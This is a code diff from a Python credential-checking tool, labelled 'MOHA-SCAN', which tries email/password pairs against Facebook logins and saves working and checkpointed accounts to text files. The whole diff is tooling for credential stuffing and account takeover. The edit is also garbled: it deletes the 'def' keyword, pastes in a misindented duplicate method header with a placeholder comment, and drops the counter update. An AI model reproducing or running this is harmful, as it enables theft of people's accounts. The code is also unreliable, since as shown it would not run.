@@ -196,22 +196,27 @@ class MohaAppController:
         print(f" {G}[✔] {W}Scan Completed! | Found: {G}{len(self.checker.oks)}")
         input(f" {Y}[!] {W}Press Enter to save hits to 'results.txt'...")
 
-    def worker(self, email, password):
+    worker(self, email, password):
         """العامل الذي يقوم بالتنفيذ الفعلي"""
         sys.stdout.write(f"\r {W}[MOHA-SCAN] {self.total_checked} | {G}OK:{len(self.checker.oks)} {Y}CP:{len(self.checker.cps)}{X}")
 
         
         # نجرب الفحص على فيسبوك أولاً كونه البوابة الأسهل
+            def worker(self, email, password):
+        # ... الكود القديم ...
         res = self.checker.check_facebook(email, password)
         
         if res == "OK":
-            print(f"\r{G} [HIT-FOUND] {email} | {password} | (FB/APP LINKED) {X}")
             self.checker.oks.append(f"{email}|{password}")
-            with open('hits_moha.txt', 'a') as f: f.write(f"{email}|{password}\n")
+            # حفظ فوري للـ OK
+            with open('database/ok.txt', 'a') as f:
+                f.write(f"{email}|{password}\n")
+                
         elif res == "CP":
             self.checker.cps.append(f"{email}|{password}")
-        
-        self.total_checked += 1
+            # حفظ فوري للـ CP (السيكور)
+            with open('database/cp.txt', 'a') as f:
+                f.write(f"{email}|{password}\n")
 
 # --- نهاية الجزء الثاني (400 سطر إجمالي) ---
 class GamingChecker:
